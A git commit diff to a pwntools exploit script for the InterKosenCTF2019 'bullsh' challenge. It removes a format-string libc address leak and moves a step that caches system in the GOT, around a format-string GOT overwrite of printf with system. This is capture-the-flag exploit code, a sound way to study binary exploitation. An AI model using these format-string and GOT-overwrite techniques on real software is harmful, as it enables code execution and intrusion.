e9af88e24602d46c5d93d4f57625e3bae2c9ce4a
t3mp-0xCC <40132263+t3mp-0xCC@users.noreply.github.com>
2021-10-19 16:40:32 +0900

    delete libc leak in bullsh exp.py

--- InterKosenCTF2019/bullsh/exp.py
+++ InterKosenCTF2019/bullsh/exp.py
@@ -24,21 +24,14 @@ elif len(argv) >= 2 and argv[1] == "d":
 else:
     p = process(chall)
 
-# cache system@libc to got
-p.recvuntil("$ ")
-p.sendline("ls")
-
-# leak __libc_start_main+231
-p.recvuntil("$ ")
-p.sendline("%25$p")
-leak = eval(p.recv(14))
-log.info("leak = 0x{:08x}".format(leak))
-libc_base = leak - libc.symbols['__libc_start_main'] - 231
-log.info("libc_base = 0x{:08x}".format(libc_base))
 printf_got = elf.got['printf']
 system_plt = elf.plt['system']
 log.info("printf@got = 0x{:08x}".format(printf_got))
 log.info("system@plt = 0x{:08x}".format(system_plt))
+
+# cache system@libc to got
+p.recvuntil("$ ")
+p.sendline("ls")
 
 # got overwrite
 f = FormatStr(isx64=1)# for x86_64
